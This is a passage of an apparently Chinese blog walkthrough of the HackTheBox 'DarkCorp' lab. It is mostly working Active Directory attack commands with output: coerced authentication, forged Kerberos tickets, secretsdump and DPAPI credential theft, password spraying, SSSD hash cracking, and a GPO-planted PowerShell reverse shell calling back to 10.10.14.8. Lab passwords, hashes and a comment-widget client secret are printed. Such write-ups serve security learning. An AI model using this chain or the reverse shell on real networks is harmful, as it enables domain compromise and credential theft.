class="line"><span class="meta">#</span><span class="bash"> 强制web01访问我们添加的dns</span></span><br><span class="line">python3 PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' web-01</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> web-01证书认证</span></span><br><span class="line">faketime -f "-16m" python3 ~/Tools/ADCS_Tools/PKINITtools/gettgtpkinit.py -cert-pfx 'WEB01$.pfx' 'DARKCORP.HTB/WEB-01$' WEB01.ccache</span><br><span class="line">export KRB5CCNAME=./WEB01.ccache</span><br><span class="line">faketime -f "-16m" python3 ~/Tools/ADCS_Tools/PKINITtools/getnthash.py -key 78ef10df6a887e91e43253bbd81c4c665c405473df6167713106a6aaec14b9aa 'darkcorp.htb/WEB-01$'</span><br><span class="line"></span><br><span class="line">Recovered NT Hash</span><br><span class="line">8f33c7fc7ff515c1f358e488fbb8b675</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021032.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021033.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021034.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021035.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021036.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>同样的relay方式也可以直接得到DC，非预期</p>
<h2 id="web-01-amp-user-flag"><a href="#web-01-amp-user-flag" class="headerlink" title="web-01 &amp; user flag"></a>web-01 &amp; user flag</h2><p>得到web-01机器hash后就是常规s4uself了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取sid</span></span><br><span class="line">nxc ldap dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --get-sid</span><br><span class="line"></span><br><span class="line">S-1-5-21-3432610366-2163336488-3604236847</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成web-01 ticket</span></span><br><span class="line">faketime -f "-16m" python3 examples/ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -domain darkcorp.htb -spn cifs/web-01.darkcorp.htb Administrator</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用ticket认证登录</span></span><br><span class="line">export KRB5CCNAME=./Administrator.ccache</span><br><span class="line">faketime -f "-16m" python3 examples/wmiexec.py Administrator@web-01.darkcorp.htb -k -no-pass -debug</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021037.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="web-01-hashdump"><a href="#web-01-hashdump" class="headerlink" title="web-01 hashdump"></a>web-01 hashdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-16m" python3 examples/secretsdump.py Administrator@web-01.darkcorp.htb -k -no-pass</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<h2 id="web-01-dpapi"><a href="#web-01-dpapi" class="headerlink" title="web-01 dpapi"></a>web-01 dpapi</h2><p>dpapi可以得到web01的本地管理员密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nxc smb web-01.darkcorp.htb -u Administrator -H 88d84ec08dad123eb04a060a74053f21 --local-auth --dpapi</span><br><span class="line"></span><br><span class="line">SMB         172.16.20.2     445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:&#123;7D87899F-85ED-49EC-B9C3-8249D246D1D6&#125; - WEB-01\Administrator:But_Lying_Aid9!</span><br></pre></td></tr></table></figure>

<p>这个不完整，需要机器上确认，sharpdpapi可以看到一个加密的文件无法自动找到master key，需要手动处理：</p>
<p>参考vintage里dpapi的离线处理方式,得到另一个密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">32B2774DF751FF7E28E78AE75C237A1E</span><br><span class="line">6037d071-cac5-481e-9e08-c4296c0a7ff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 ~/Tools/impacket/impacket_main/examples/dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500  -password 'But_Lying_Aid9!'   </span><br><span class="line">python3 ~/Tools/impacket/impacket_main/examples/dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E -key 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da</span><br><span class="line"></span><br><span class="line">Username    : Administrator</span><br><span class="line">Unknown     : Pack_Beneath_Solid9!</span><br></pre></td></tr></table></figure>

<h1 id="john-w"><a href="#john-w" class="headerlink" title="john.w"></a>john.w</h1><p>使用得到的密码喷洒，发现john.w复用这个密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!'  --continue-on-success</span><br><span class="line"></span><br><span class="line">LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021038.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="angela-w"><a href="#angela-w" class="headerlink" title="angela.w"></a>angela.w</h2><p>john.w对angela.w有GenericWrite,所以直接shadow ceds：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-16m" certipy shadow auto -u john.w@darkcorp.htb -p 'Pack_Beneath_Solid9!' -dc-ip 172.16.20.1 -ns 172.16.20.1 -target dc-01.darkcorp.htb -account angela.w</span><br><span class="line"></span><br><span class="line">[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021039.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="Linux-Admins"><a href="#Linux-Admins" class="headerlink" title="Linux_Admins"></a>Linux_Admins</h1><p>angela.w的管理员账号angela.w.adm是Linux_Admins成员，linux使用kerberos认证一般是sssd GSSAPI：</p>
<ul>
<li>A broken marriage. Abusing mixed vendor Kerberos stacks | Pen Test Partners<br><a href="https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/</a></li>
</ul>
<p>所以就是通过john.w修改angela.w的upn，然后生成票据登录Linux：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 powerview.py john.w:<span class="string">'Pack_Beneath_Solid9!'</span>@darkcorp.htb</span></span><br><span class="line"></span><br><span class="line">PV &gt; Set-DomainObject -Identity angela.w -Set userPrincipalName=angela.w.adm</span><br><span class="line"></span><br><span class="line">faketime -f "-16m" python3 examples/getTGT.py darkcorp.htb/angela.w.adm -hashes :957246c8137069bca672dc6aa0af7c7a -principalType NT_ENTERPRISE</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021040.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021041.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="angela-w-adm"><a href="#angela-w-adm" class="headerlink" title="angela.w.adm"></a>angela.w.adm</h2><p>之后使用ticket登录linux：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./angela.w.adm.ccache</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 快速操作，提示要密码就重做一遍前面的修改upn流程</span></span><br><span class="line">ssh -K angela.w.adm@drip.darkcorp.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021042.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="etc-krb5-conf"><a href="#etc-krb5-conf" class="headerlink" title="/etc/krb5.conf"></a>/etc/krb5.conf</h2><p>修改本地kerberos配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">        default_realm &#x3D; DARKCORP.HTB</span><br><span class="line">        dns_lookup_realm &#x3D; true</span><br><span class="line">        dns_lookup_kdc &#x3D; true</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">        DARKCORP.HTB &#x3D; &#123;</span><br><span class="line">                kdc &#x3D; darkcorp.htb</span><br><span class="line">                admin_server &#x3D; darkcorp.htb</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">        .darkcorp.htb &#x3D; DARKCORP.HTB</span><br><span class="line">        darkcorp.htb &#x3D; DARKCORP.HTB</span><br></pre></td></tr></table></figure>

<h1 id="sssd"><a href="#sssd" class="headerlink" title="sssd"></a>sssd</h1><p>得到了使用sshd的Linux root，搜索可以找到：</p>
<ul>
<li>SSSD Privilege Escalation | Exploit Notes<br><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sssd-privilege-escalation/" target="_blank" rel="noopener">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sssd-privilege-escalation/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/lib/sss/</span><br><span class="line">ls -la /var/lib/sss/db</span><br><span class="line">strings /var/lib/sss/db/*.ldb | grep '\$6\$'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$5wwc6mW6nrcRD4Uu</span><span class="variable">$9rigmpKLyqH</span>/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.</span></span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$5wwc6mW6nrcRD4Uu</span><span class="variable">$9rigmpKLyqH</span>/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.</span></span><br></pre></td></tr></table></figure>

<p>得到了hash，可以破解出另一个linux admin用户taylor.b.adm密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">!QAZzaq1</span><br></pre></td></tr></table></figure>

<h1 id="taylor-b-adm-to-root"><a href="#taylor-b-adm-to-root" class="headerlink" title="taylor.b.adm to root"></a>taylor.b.adm to root</h1><p>(最快到这一步的方式是得到初步Linux后直接爆破taylor.b.adm的密码，非预期方式)</p>
<p>taylor.b.adm在remote manage组中，可以winrm登录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taylor.b.adm !QAZzaq1</span><br><span class="line">evil-winrm -i 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'</span><br></pre></td></tr></table></figure>

<p>并且是gpo_manager成员，所以下一步很明显是GPO：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021028.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gpo-abuse"><a href="#gpo-abuse" class="headerlink" title="gpo abuse"></a>gpo abuse</h2><p>常规gpo abuse，有杀软，所以远程用pygpoabuse：</p>
<ul>
<li>Hackndo/pyGPOAbuse: Partial python implementation of SharpGPOAbuse<br><a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noopener">https://github.com/Hackndo/pyGPOAbuse</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents&gt; Get-GPO -All</span><br><span class="line"></span><br><span class="line">SecurityUpdates</span><br><span class="line">652cae9a-4bb7-49f2-9e52-3361f33ce786</span><br><span class="line"></span><br><span class="line">python3 pygpoabuse.py darkcorp.htb/taylor.b.adm:'!QAZzaq1' -dc-ip 172.16.20.1 -gpo-id "652CAE9A-4BB7-49F2-9E52-3361F33CE786" -powershell -command "\$c = New-Object System.Net.Sockets.TCPClient('10.10.14.8',4444);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%&#123;0&#125;;while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0)&#123; \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i); \$sb = (iex \$d 2&gt;&amp;1 | Out-String ); \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps&gt; '); \$s.Write(\$sb,0,\$sb.Length); \$s.Flush()&#125;;\$c.Close()" -taskname "MyTask" -description "miao"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新执行</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents&gt; gpupdate /force</span><br></pre></td></tr></table></figure>

<p>得到 DC system：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021029.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>直接添加用户到域管，然后dump：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ps&gt;</span><span class="bash"> net group <span class="string">"Domain Admins"</span> taylor.b.adm /add</span></span><br><span class="line"></span><br><span class="line">python3 examples/secretsdump.py taylor.b.adm:'!QAZzaq1'@172.16.20.1 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>

<p>之后使用Administrator hash登录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 172.16.20.1 -u Administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021030.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python3 examples&#x2F;secretsdump.py taylor.b.adm:&#39;!QAZzaq1&#39;@172.16.20.1 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::</span><br><span class="line">victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::</span><br><span class="line">svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::</span><br><span class="line">john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::</span><br><span class="line">angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::</span><br><span class="line">angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::</span><br><span class="line">taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::</span><br><span class="line">taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::</span><br><span class="line">darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::</span><br><span class="line">darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::</span><br><span class="line">DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::</span><br><span class="line">DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:fa133329576858e48f4e1a8de10d7f56:::</span><br><span class="line">WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>roundcube/roundcubemail: The Roundcube Webmail suite<br><a href="https://github.com/roundcube/roundcubemail" target="_blank" rel="noopener">https://github.com/roundcube/roundcubemail</a></li>
<li>Government Emails at Risk: Critical Cross-Site Scripting Vulnerability in Roundcube Webmail | Sonar<br><a href="https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/" target="_blank" rel="noopener">https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/</a></li>
<li>Release Nmap v7.91SVN · ernw/static-toolbox<br><a href="https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.91SVN" target="_blank" rel="noopener">https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.91SVN</a></li>
<li>Configuring NTLM with Burp Suite - PortSwigger<br><a href="https://portswigger.net/support/configuring-ntlm-with-burp-suite" target="_blank" rel="noopener">https://portswigger.net/support/configuring-ntlm-with-burp-suite</a></li>
<li>Relaying Kerberos over SMB using krbrelayx<br><a href="https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx" target="_blank" rel="noopener">https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx</a></li>
<li>A broken marriage. Abusing mixed vendor Kerberos stacks | Pen Test Partners<br><a href="https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/</a></li>
<li>SSSD Privilege Escalation | Exploit Notes<br><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sssd-privilege-escalation/" target="_blank" rel="noopener">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sssd-privilege-escalation/</a></li>
<li>Hackndo/pyGPOAbuse: Partial python implementation of SharpGPOAbuse<br><a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noopener">https://github.com/Hackndo/pyGPOAbuse</a></li>
<li>HackTheBox - Machine - DarkCorp<br><a href="https://manesec.github.io/2025/02/15/2025/23-hackthebox-DarkCorp/#Making-Bloodhound-work" target="_blank" rel="noopener">https://manesec.github.io/2025/02/15/2025/23-hackthebox-DarkCorp/#Making-Bloodhound-work</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2025-10-23T10:50:04.466Z" itemprop="dateUpdated">2025-10-23 18:50:04</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/&title=《DarkCorp - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/&title=《DarkCorp - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DarkCorp - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2025/02/20/Titanic-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Titanic - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2025/02/05/Cat-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Cat - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/&title=《DarkCorp - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/&title=《DarkCorp - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
